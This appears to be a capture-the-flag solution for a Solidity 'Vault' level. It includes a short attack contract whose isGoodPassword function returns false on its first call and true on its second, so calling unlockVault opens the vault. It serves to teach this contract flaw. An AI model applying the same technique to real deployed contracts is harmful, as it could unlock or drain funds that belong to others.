# Vault

## Solution :

To validate this challenge, the user needs to open the bank, so he needs to make `open = true`.

To do that, he needs to create an attack contract with a function which is the same as the one is the interface `Bank`.

This function needs to return `false` the first time, which is called and `true` the second time.

Finally, he needs to call with the attack contract the `unlockVault()` function with a non specific params.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/intermediateChalls/Vault.sol";

contract attackVault {
	Vault originalContract;
	uint public i = 0;

	constructor(address _originalContract) public {
		originalContract = Vault(_originalContract);
	}

	function isGoodPassword(uint _password) external returns (bool) {
		if (i == 0) {
			i = 1;
			return false;
		}
		return true;
	}

	function exploit() public {
		originalContract.unlockVault(10);
	}
}
```